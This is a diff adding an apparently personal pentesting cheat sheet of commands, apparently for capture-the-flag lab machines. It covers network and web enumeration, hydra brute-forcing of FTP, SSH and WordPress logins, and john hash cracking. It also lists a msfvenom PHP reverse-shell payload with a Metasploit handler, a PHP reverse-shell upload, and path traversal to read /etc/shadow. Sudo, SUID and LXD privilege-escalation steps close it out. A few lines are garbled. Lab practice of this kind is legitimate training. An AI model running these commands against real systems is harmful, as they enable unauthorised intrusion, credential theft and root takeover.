@@ -1,0 +1,171 @@
+### nmap scan 
+nmap -sC -sV -oN nmap/initial 10.10.23.209
+sudo nmap -sC -sV -sS -T4 -A -script vuln -oN info/log_nmap2.txt 10.10.40.63
+
+
+### gather info
+gobuster dir -u http://10.10.23.209/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+uniscan -u http://10.10.197.239/ -qweds 
+
+nikto -h 10.10.197.239 -output niktolog.txt
+
+enum4linux -a 10.10.100.180 | tee enum4linux.log
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://enterprize.thm/FUZZ -o info/log_fuff1.txt
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://enterprize.thm/FUZZ -e .json,.php,.html,.bak,.old,.sql -fc 403 -o info/log_fuff_files.txt
+
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.enterprize.thm" -u http://10.10.162.26/ -fs 85 -o info/log_fuff_subdomains.txt
+
+
+
+### get header
+curl -A "C" -L 10.10.134.119
+wget -q --server-response http://10.10.68.138 
+curl -I http://10.10.68.138
+
+
+### hydra crack password
+hydra -l chris -P /usr/share/wordlists/rockyou.txt.gz 10.10.134.119 ftp -t 4  
+hydra -l lin -P locks.txt 10.10.40.63 ssh
+hydra -l jan -P /usr/share/wordlist/rockyou.txt ssh://10.10.23.209
+
+
+### hydra login
+hydra -l Elliot -P fsocity.dic 10.10.197.239 http-post-form "/wp-login:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=10.10.197.239/wp-admin/&testcookie=1:S=302"
+
+hydra -L new_wordlist.txt-P new_wordlist.txt 10.10.112.108 http-post-form "/users/login.php:username=^PASS^&password=^PASS^:The username/password combination you have entered is invalid" -t 4
+
+
+### ssh crack
+wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
+python ssh2john.py > kay_id_rsa
+john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+
+### connect to server
+ftp 10.10.134.119
+ssh -i kay_id_rsa@10.10.159.149
+
+
+### image info
+bikwalk cutie.png
+steghide info cute-alien.jpg
+exiftool WindowsXp.jpg
+
+
+
+### image extract 
+binwalk -e cutie.png
+steghide extract -sf cute-alien.jpg
+
+
+##crack zip file
+zip2john 8702.zip > zip.hash
+john zip.hash
+7z e 8702.zip
+
+
+### backdoor
+generate our backdoor
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.64.179 LPORT=4444 -f raw -o payload.php
+
+ Create our payload handler
+msfconsole
+$ use exploit/multi/handler
+$ set payload php/meterpreter/reverse_tcp
+$ set LHOST 192.168.0.32
+$ set LPORT 4444
+$ run
+meterpreter >
+meterpreter > shell 
+python -c 'import pty; pty.spawn("/bin/bash")'
+# To find the root process 
+find / -perm +6000 2>/dev/null | grep '/bin/'
+/usr/local/bin/nmap
+robot@linux:/$ nmap --interactive
+
+
+/uploads
+cp /usr/share/webshells/php/php-reverse-shell.php ./
+chang ip and port
+
+mv php-reverse-shell.php php-reverse-shell.php5
+upload file to /panel
+nc -lvp 10.10.150.230
+go to /uploads and click on file
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+find / -type f -name user.txt
+cat /vat/www/user.txt
+find / -type f -user root -perm -4000 2>/dev/null
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+cat /root/root.txt
+
+
+### server command
+sudo -l
+
+(ALL, !root) /bin/bash
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287
+sudo -u \#$((0xffffffff)) /bin/bash
+
+(root) /bin/tar
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+cd /home; ls -la; pwd
+less /home/rick/'second ingredients'
+
+
+### server error
+http://10.10.188.103/article?name=../../../../etc/shadow
+http://10.10.188.103/article?name=../../../../etc/passwd
+http://10.10.188.103/article?name=../../../../home/falconfeast/user.txt
+http://10.10.188.103/article?name=../../../../root/root.txt
+
+
+### CMS Made Simple
+python3 cmsmadesimple22-sql.py -u http://10.10.152.40/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+hydra -l mitch -P /usr/share/wordlist/rockyou.txt 10.10.213.182 http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect" -v
+[2222][ssh] host: 10.10.153.232   login: mitch   password: secretJust type sudo vim, and inside the text editor invoke the shell by typing :!bash
+
+
+### server vuln 
+linpeas.sh
+
+
+### lxd(Linux Containers)
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+
+*** fix error ***
+	Go into rootfs/use/share directory
+cd rootfs/usr/share/
+	Create the alpine-mirrors directory
+mkdir alpine-mirrors
+	Go into the alpine-mirrors directory, create a file called MIRRORS.txt
+cd alpine-mirrors/
+vi MIRRORS.txt
+	Add in the following link into MIRRORS.txt file
+http://alpine.mirror.wearetriple.com
+	Save the MIRRORS.txt file and then run the build-alpine again.
+sudo ./build-alpine
+
+cd lxd-alpine-builder
+python3 -m SimpleHTTPServer
+
+	import the image by running:
+
+lxc image import ./alpine-v3.12-x86_64-20200830_2354.tar.gz --alias myimage
+	
+	then spawn a root shell by running this list of commands
+
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+whoami
+
+
+
